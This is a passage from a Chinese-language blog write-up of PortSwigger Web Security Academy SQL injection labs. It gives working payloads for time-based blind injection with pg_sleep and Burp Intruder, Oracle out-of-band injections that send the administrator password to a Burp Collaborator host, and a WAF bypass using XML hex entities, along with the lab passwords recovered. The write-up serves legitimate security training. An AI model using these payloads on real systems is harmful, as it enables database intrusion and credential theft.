+<p>3）这里会出错，因为不管是什么条件，这里 <code>select</code>  都返回 <code>void</code>，是没办法满足 <code>union</code> 的</p>
+<p>4）考虑到上一题的解法，这里使用 <code>||</code> 来拼接字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">X&#x27; union</span><br><span class="line">select</span><br><span class="line">  case when (length(username)=13) then pg_sleep(10)||&#x27;a&#x27; else pg_sleep(0)||&#x27;b&#x27; end</span><br><span class="line">from</span><br><span class="line">  users</span><br><span class="line">where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>
+
+<p>5）这里还只有 <code>1</code> 列数据，我们可以先测试是否存在时延，如果是则说明就只有一列数据，否则还需要测试出数据列数</p>
+<p>6）实际测试表明，确实只有一列数据</p>
+<p>现在，爆破模板确认了，就可以测试出密码字段的长度了，模板如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">X&#x27; union</span><br><span class="line">select</span><br><span class="line">  case when (length(password)=§1§) then pg_sleep(10)||&#x27;a&#x27; else pg_sleep(0)||&#x27;b&#x27; end</span><br><span class="line">from</span><br><span class="line">  users</span><br><span class="line">where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>
+
+<p>在 <a href="https://secdroid.github.io/tags/Burp-Intruder/">Burp Intruder</a> 中，确认时延的方法在 <a href="https://secdroid.github.io/2025/01/13/burp-web-academy-authentication/">Burp Web Academy 鉴权漏洞</a> 有讲，可以参考之。实际测试结果表明，密码字段的长度还是 <code>20</code>。接下来，就需要挨个爆破密码字符了，题目本身没给提示，但我想密码字符应该还是 <code>0123456789abcdefghijklmnopqrstuvwxyz</code>。</p>
+<p>使用 Cluster Bomb 模式攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X&#x27; union select case when (substring(password,§1§,1)=&#x27;§0§&#x27;) then pg_sleep(20)||&#x27;a&#x27; else pg_sleep(0)||&#x27;b&#x27; end from users where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>
+
+<p>注意，这里盲注的时延要设大一点，否则很可能难以和正常的请求区分开来（如果网络本身不是很好的话）；最终的密码为 <code>mw478rp4wz48m035ssf9</code>。</p>
+<h3 id="2-6-Lab-Blind-SQL-injection-with-out-of-band-interaction"><a href="#2-6-Lab-Blind-SQL-injection-with-out-of-band-interaction" class="headerlink" title="2.6 Lab: Blind SQL injection with out-of-band interaction"></a>2.6 Lab: Blind SQL injection with out-of-band interaction</h3><blockquote>
+<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
+<p>The SQL query is executed asynchronously and has no effect on the application’s response. However, you can trigger out-of-band interactions with an external domain.</p>
+<p>To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.</p>
+</blockquote>
+<p>参考了答案（是 Oracle 数据库），Payload 从 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> 复制，替换 <a href="https://secdroid.github.io/tags/Burp-Collaborator/">Burp Collaborator</a> 域名，然后对 <code>%;</code> 进行 URL 编码即可。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ac1009003df5d54805cb37500da0049.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=&#x27; union SELECT EXTRACTVALUE(xmltype(&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY %25 remote SYSTEM &quot;http://f9pxrqzetanfzr6kfshia78kwb22qtei.oastify.com&quot;&gt; %25remote%3b]&gt;&#x27;),&#x27;/l&#x27;) FROM dual--; session=p0mhOZJU9yvs3bv2YKv9QSjTelwFasGO</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-7-Lab-Blind-SQL-injection-with-out-of-band-data-exfiltration"><a href="#2-7-Lab-Blind-SQL-injection-with-out-of-band-data-exfiltration" class="headerlink" title="2.7 Lab: Blind SQL injection with out-of-band data exfiltration"></a>2.7 Lab: Blind SQL injection with out-of-band data exfiltration</h3><blockquote>
+<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
+<p>The SQL query is executed asynchronously and has no effect on the application’s response. However, you can trigger out-of-band interactions with an external domain.</p>
+<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.</p>
+<p>To solve the lab, log in as the <code>administrator</code> user.</p>
+</blockquote>
+<p>直接套用 Cheat Sheet 的 Oracle Payload：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0afc009d0396880a82f117540021000b.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=&#x27; union SELECT EXTRACTVALUE(xmltype(&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY %25 remote SYSTEM &quot;http://&#x27;||(select password from users where username=&#x27;administrator&#x27;)||&#x27;.f9pxrqzetanfzr6kfshia78kwb22qtei.oastify.com&quot;&gt; %25remote%3b]&gt;&#x27;),&#x27;/l&#x27;) FROM dual--; session=z6RTZ5PsrOakJCiknhTe0NsoOPH4MXaS</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-8-Lab-SQL-injection-with-filter-bypass-via-XML-encoding"><a href="#2-8-Lab-SQL-injection-with-filter-bypass-via-XML-encoding" class="headerlink" title="2.8 Lab: SQL injection with filter bypass via XML encoding"></a>2.8 Lab: SQL injection with filter bypass via XML encoding</h3><blockquote>
+<p>This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables.</p>
+<p>The database contains a <code>users</code> table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user’s credentials, then log in to their account.</p>
+</blockquote>
+<p>发送带有特殊字符串的 Payload：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/product/stock</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a89005704e3d43981af947300e800c3.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=MZOrHlbwdfeEozaSDZpAt3hzCJr7PNJD</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>116</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">productId</span>&gt;</span>1&#x27;<span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>2<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>会提示检测到攻击行为：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">403</span> Forbidden</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>17</span><br><span class="line"></span><br><span class="line"><span class="language-1c"><span class="string">&quot;Attack detected&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>参考官方答案：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>&lt;@hex_entities&gt;1 UNION SELECT username || &#x27;~&#x27; || password FROM users&lt;/@hex_entities&gt;<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里用到了一个名为 <code>Hackvertor</code> 的 Burp 插件，使用了他提供的 <code>hex_entities</code> 编码功能。查了一下，XML 支持使用 16 进制来编码 Unicode 字符：</p>
+<blockquote>
+<p>Hexadecimal entities in XML are a way to represent characters using their Unicode code points. They are written in the format <code>&amp;#xHHHH;</code>, where <code>HHHH</code> is the hexadecimal code of the character. This is useful for encoding special characters, symbols, or non-ASCII characters within an XML document.</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span>&gt;</span>This is a smiley face: <span class="symbol">&amp;#x1F600;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span> <span class="comment">&lt;!-- 😀 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span>&gt;</span>This is a heart: <span class="symbol">&amp;#x2764;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span> <span class="comment">&lt;!-- ❤ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span>&gt;</span>This is a check mark: <span class="symbol">&amp;#x2713;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span> <span class="comment">&lt;!-- ✓ --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>知道了原理，我们就可以自己实现，而不用借助于插件了。而且测试下来发现，WAF 只检测了 <code>union/select/&#39;</code>，所以也可以简单点：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">productId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1 <span class="symbol">&amp;#x0055;</span>NION <span class="symbol">&amp;#x0053;</span>ELECT username || <span class="symbol">&amp;#x0027;</span>~<span class="symbol">&amp;#x0027;</span> || password FROM users<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>HTTP Response 直接返回了查询结果：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>100</span><br><span class="line"></span><br><span class="line"><span class="language-maxima">wiener~qdfzjzdq698vwhelo3xb</span></span><br><span class="line"><span class="language-maxima">administrator~e2woyn4r8l19954m2vis</span></span><br><span class="line"><span class="language-maxima">carlos~fa41qa981t9av3jvlsqs</span></span><br><span class="line"><span class="language-maxima"><span class="number">838</span> <span class="built_in">units</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03. 小结"></a>0x03. 小结</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></li>
+<li>盲注场景下的数据库表字段的值爆破<ul>
+<li>length</li>
+<li>substring<ul>
+<li>Oracle 使用 <code>substr</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>基于延时的盲注<ul>
+<li>合理设置盲注时延，防止网络本身的延迟或者不稳定产生干扰</li>
+</ul>
+</li>
+<li>XML 16 进制编码<ul>
+<li><code>&amp;#xHHHH;</code></li>
+</ul>
+</li>
+<li>充分利用服务器返回的错误信息来推断后台的运行逻辑</li>
+</ul>
+<h2 id="0x04-参考文档"><a href="#0x04-参考文档" class="headerlink" title="0x04. 参考文档"></a>0x04. 参考文档</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#sql-injection">https://portswigger.net/web-security/all-labs#sql-injection</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQL-Injection/" rel="tag"># SQL Injection</a>
+              <a href="/tags/Burp-Intruder/" rel="tag"># Burp Intruder</a>
+              <a href="/tags/Burp-Collaborator/" rel="tag"># Burp Collaborator</a>
+              <a href="/tags/Blind-Injection/" rel="tag"># Blind Injection</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/05/burp-web-academy-sql-injection/" rel="prev" title="Burp Web Academy SQL 注入">
+                  <i class="fa fa-angle-left"></i> Burp Web Academy SQL 注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Livermore</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
